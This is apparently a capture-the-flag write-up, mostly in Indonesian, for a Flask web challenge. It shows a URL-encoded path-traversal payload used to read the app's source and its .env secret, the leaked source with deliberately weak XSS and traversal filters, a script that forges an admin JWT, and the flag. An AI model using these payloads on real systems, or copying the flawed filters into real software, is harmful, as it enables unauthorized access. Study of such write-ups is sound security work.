---
title: "Wildlife Tracker"
description: ""
pubDate: 2025-07-13 21:00
category: "Web Exploitation"
event: "FIT Competition"
heroImage: ""
---

## Wildlife Tracker

> The "Wildlife Tracker" promises to help keep tabs on various species. However, every good system has its blind spots, and this one might be no exception. Can you exploit its nuances and gain unauthorized access to its deeper operations?

Diberikan sebuah link website

Di situ ada field untuk mengisi sesuatu, setelah coba lakukan xss, ssti tapi tidak work, berarti bukan itu intended nya. Lalu setelah membuka di bagian

http://134.209.102.23:8082/about, ditemukan seperti ini

http://134.209.102.23:8082/?read_file=wildlife_info.txt

Ada parameter endpoint, jadi bisa directory transversal, setelah coba berkali kali, akhirnya kita menemukan formula untuk bypass nya. Karena setelah cek etc/passwd no ingfo, jadi coba guessing supaya dapet konfigurasi web.

Dan dapet cik lesgoo

http://134.209.102.23:8082/?read_file=/%2e%2e%2f/%2e%2e%2f/%2e%2e%2f/%2e%2e%2fapp.py

```python
from flask import Flask, request, render_template, make_response, send_file
import os
import jwt
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

app.config['SECRET_KEY'] = os.getenv('SECRET_KEY',
'default_fallback_ctf_key_NOT_SECURE_IN_PROD')

JWT_ALGORITHM = "HS256"

if not app.config['SECRET_KEY'] or app.config['SECRET_KEY'] == \
'default_fallback_ctf_key_NOT_SECURE_IN_PROD':
print("WARNING: SECRET_KEY not set in .env or environment variables. Using \
a default fallback key.")
print("This default key can be used if .env is not found, making the \
challenge easier if known.")

basedir = os.path.abspath(os.path.dirname(__file__))

FLAG_FILE = os.path.join(os.path.dirname(basedir), 'forbidden', 'flag.txt')

def is_safe(input_string):
"""
Checks if the input string contains potentially dangerous HTML or script
tags.
This function specifically targets '<script' and the combination of 'on'
and '='.
The CTF challenge solution leverages JavaScript pseudo-protocol with encoded
characters to bypass this particular filter.
"""
input_lower = input_string.lower()
if "<script" in input_lower:
return False
if "on" in input_lower and "=" in input_lower:
return False
return True

@app.route('/', methods=['GET', 'POST'])
def index():
"""
Handles the main page where users can submit wildlife observations.

It also contains the LFI vulnerability, triggered by a 'read_file' query
parameter.
If 'read_file' is present, it attempts to read and display the file.
Otherwise, it processes observation submissions.
"""
filename_to_read = request.args.get('read_file')
if filename_to_read:
base_dir = os.getcwd()

file_path = os.path.join(base_dir, filename_to_read)
abs_file_path = os.path.abspath(file_path)

if not abs_file_path.startswith(base_dir):
return "Access denied: Path traversal detected!", 403

try:
return send_file(abs_file_path, mimetype='text/plain')
except FileNotFoundError:
return f"File '{filename_to_read}' not found.", 404
except IsADirectoryError:
return f"'{filename_to_read}' is a directory, not a file.", 400
except Exception as e:
return f"Error reading file: {e}", 500

observation = ""
if request.method == 'POST':
observation = request.form.get('observation', '')
if not is_safe(observation):
observation = "Your observation was flagged as potentially \
disruptive and has been filtered. Try again with safe content!"

return render_template('index.html', observation=observation)

@app.route('/admin_dashboard')
def admin_dashboard():
"""
Handles access to the administrative dashboard.
Access is granted only if a valid JWT 'admin_token' cookie is present and
verified.
The flag is loaded dynamically from an external file after authentication.
"""
admin_token_cookie = request.cookies.get('admin_token')
is_admin_authorized = False
flag = "Flag not found or unauthorized."

if admin_token_cookie:

try:
token_data = jwt.decode(
admin_token_cookie,
app.config['SECRET_KEY'],
algorithms=[JWT_ALGORITHM]
)

if token_data.get('role') == 'admin' and \
token_data.get('authorized') == True:
is_admin_authorized = True
except jwt.ExpiredSignatureError:
print("Admin token expired.")
is_admin_authorized = False
except jwt.InvalidTokenError as e:
print(f"Invalid admin token: {e}")
is_admin_authorized = False
except Exception as e:
print(f"Unexpected error processing token: {e}")
is_admin_authorized = False

if is_admin_authorized:
try:
with open(FLAG_FILE, 'r') as f:
flag = f.read().strip()
except FileNotFoundError:
print(f"ERROR: Flag file not found at {FLAG_FILE}")
flag = "CTF Flag file missing on server."
except Exception as e:
print(f"ERROR: Could not read flag file: {e}")
flag = "Error loading CTF flag."

return render_template('admin.html', flag=flag)
else:
response = make_response(render_template('unauthorized.html'), 401)
response.headers['WWW-Authenticate'] = 'Basic realm="Admin Required"'
return response

@app.route('/about')
def about():
return render_template('about.html')

@app.route('/observations')
def observations():
return render_template('observations.html')

@app.route('/unauthorized')
def unauthorized():
return render_template('unauthorized.html')

if __name__ == '__main__':
app.run(debug=False, host='0.0.0.0', port=8082)
```

Ok dari program tersebut kita bisa tau algoritma buat token admin login nya, tapi kita belum tau secret key buat token nya, dari situ diketahui kalo secret disimpan di .env

Kita coba akses file env nya melalui teknik yang sama

http://134.209.102.23:8082/?read_file=/%2e%2e%2f/%2e%2e%2f/%2e%2e%2f/%2e%2e%2f.env

```
SECRET_KEY=wildlife- 2025 - fit-challenge-secret
```

Karena udah dapet semua tinggal kita buat program untuk generate token berdasarkan algoritma dan secret key tersebut.

```python
import jwt
import datetime

# From app.py
SECRET_KEY = "wildlife-2025-fit-challenge-secret"
JWT_ALGORITHM = "HS256"

def generate_admin_token():
payload = {
'role': 'admin',
'authorized': True,
'exp': datetime.datetime.utcnow() + datetime.timedelta(hours=1) # Token
expires in 1 hour
}
token = jwt.encode(payload, SECRET_KEY, algorithm=JWT_ALGORITHM)
return token

if __name__ == '__main__':
admin_token = generate_admin_token()
print(f"Generated Admin Token: {admin_token}")
```

Setelah dapet cookies token nya tinggal set dan akses /admin_dashboard

### Flag:

```
FITUKSW{b10d1v3rsqty_1n_th3_w1ld}
```
